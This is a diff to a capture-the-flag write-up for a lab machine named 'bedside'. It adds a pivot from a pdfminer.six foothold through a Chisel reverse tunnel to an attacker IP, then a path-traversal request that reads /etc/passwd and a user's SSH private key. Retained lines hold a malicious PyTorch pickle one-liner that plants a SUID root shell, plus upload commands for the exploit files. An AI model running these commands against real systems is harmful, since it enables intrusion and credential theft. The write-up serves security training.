@@ -2,7 +2,7 @@
 
 ## Summary
 
-This machine involved exploiting CVE-2025-64512 (pdfminer.six arbitrary code execution) to gain initial access, then escalating privileges through a PyTorch checkpoint deserialization vulnerability to achieve root.
+This machine involved exploiting CVE-2025-64512 (pdfminer.six arbitrary code execution) to gain initial access as `datawrangler`, then pivoting to the `developer` user via a Local File Inclusion vulnerability on an internal port, and finally escalating privileges through a PyTorch checkpoint deserialization vulnerability to achieve root.
 
 ## Reconnaissance
 
@@ -232,6 +232,63 @@ datawrangler@data-wrangler:/app$ whoami
 datawrangler
 ```
 
+## Pivoting to Developer User
+
+### Internal Service Discovery
+
+From the `datawrangler` shell, enumeration revealed an internal service on port 3000:
+
+```bash
+curl -s http://127.0.0.1:3000
+```
+
+The response showed a React development server with Hot Module Replacement enabled, indicating the service was running in development mode.
+
+### Port Forwarding with Chisel
+
+To access the internal service from the attacker machine, Chisel was used to create a tunnel:
+
+```bash
+# On attacker machine - start Chisel server
+./chisel server -p 8001 --reverse
+
+# On target machine - connect back
+./chisel client 10.10.15.231:8001 R:3000:127.0.0.1:3000
+```
+
+### Local File Inclusion Vulnerability
+
+The development server was vulnerable to path traversal. Using the `?raw=1&module=1` parameters allowed arbitrary file reading:
+
+```bash
+curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../etc/passwd?raw=1&module=1'
+```
+
+The output revealed a `developer` user on the system.
+
+### Reading the SSH Private Key
+
+The LFI vulnerability was then used to read the developer user's SSH private key:
+
+```bash
+curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
+```
+
+The private key was copied and saved to a file on the attacker machine.
+
+### SSH Access as Developer
+
+```bash
+chmod 600 developer_key
+ssh -i developer_key developer@bedside.htb
+```
+
+Successfully logged in as the `developer` user:
+```
+developer@bedside:~$ whoami
+developer
+```
+
 ## Privilege Escalation
 
 ### Enumeration
@@ -253,12 +310,11 @@ cat /app/pdf_watcher.py
 ### Discovery
 
 1. User `developer` exists on the system
-2. Port 3000 runs a React app in development mode
-3. Sudo entry for developer:
+2. Sudo entry for developer:
    ```
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
    ```
-4. Data directories:
+3. Data directories:
    - `/datastore/checkpoints/` - writable by datawrangler
    - `/datastore/processed/` - read by trainer script
 
@@ -295,7 +351,7 @@ base64 -w0 /tmp/checkpoint_epoch_1000.pt
 
 #### Step 2: Write Checkpoint
 
-The datawrangler user has write access to `/datastore/checkpoints/`.
+The datawrangler user has write access to `/datastore/checkpoints/`. Using the reverse shell from the initial foothold:
 
 ```bash
 echo "<BASE64_OUTPUT>" | base64 -d > /datastore/checkpoints/checkpoint_epoch_1000.pt
@@ -362,23 +418,51 @@ cat /root/root.txt
 - **User flag**: `b30f6121bb31e05a05b53e65ef29aefc`
 - **Root flag**: Retrieved from `/root/root.txt`
 
+## Attack Chain Summary
+
+```
+CVE-2025-64512 (pdfminer.six)
+    ↓
+Reverse shell as datawrangler
+    ↓
+Internal port 3000 (React dev server)
+    ↓
+LFI via path traversal
+    ↓
+Read /home/developer/.ssh/id_rsa
+    ↓
+SSH as developer
+    ↓
+Sudo to run /opt/trainer/bedside_trainer.py
+    ↓
+PyTorch checkpoint deserialization
+    ↓
+SUID shell /opt/rootbash
+    ↓
+Root access
+```
+
 ## Tools Used
 
 - `nmap` - Port scanning
 - `gobuster` - Directory enumeration
-- `curl` - HTTP requests
+- `curl` - HTTP requests and LFI exploitation
 - `python3` - Payload generation and exploitation
 - `base64` - Data encoding
 - `torch` - PyTorch checkpoint creation
 - `nc` - Reverse shell listener
+- `chisel` - Port forwarding
+- `ssh` - Secure shell access
 
 ## Key Takeaways
 
 1. **CVE-2025-64512** allows arbitrary code execution via PDF processing in pdfminer.six
-2. **Pickle deserialization** is dangerous - never use `pickle.loads()` on untrusted data
-3. **PyTorch checkpoints** can contain malicious pickles that execute code on load
-4. **Proper path validation** is critical - the PDF should not allow arbitrary file paths
-5. **Least privilege principle** - limit write access to directories containing processed data
+2. **Internal services** often expose attack surfaces that aren't visible externally
+3. **Development servers** frequently have path traversal vulnerabilities
+4. **SSH private keys** should never be readable by other users
+5. **Pickle deserialization** is dangerous - never use `pickle.loads()` on untrusted data
+6. **PyTorch checkpoints** can contain malicious pickles that execute code on load
+7. **Least privilege principle** - limit write access to directories containing processed data
 
 ## Proof of Concept Commands
 
@@ -389,6 +473,11 @@ zip shell.zip shell.pickle.gz
 zip evil.zip evil.pdf
 curl -X POST http://research.bedside.htb/ -F "uploadFile=@shell.zip"
 curl -X POST http://research.bedside.htb/ -F "uploadFile=@evil.zip"
+
+# Pivot to developer
+./chisel client 10.10.15.231:8001 R:3000:127.0.0.1:3000
+curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
+ssh -i developer_key developer@bedside.htb
 
 # Root escalation
 python3 -c "import torch, os; class Evil: def __reduce__(self): return (os.system, ('cp /bin/bash /opt/rootbash; chmod 4755 /opt/rootbash',)); torch.save(Evil(), '/tmp/checkpoint.pt')"
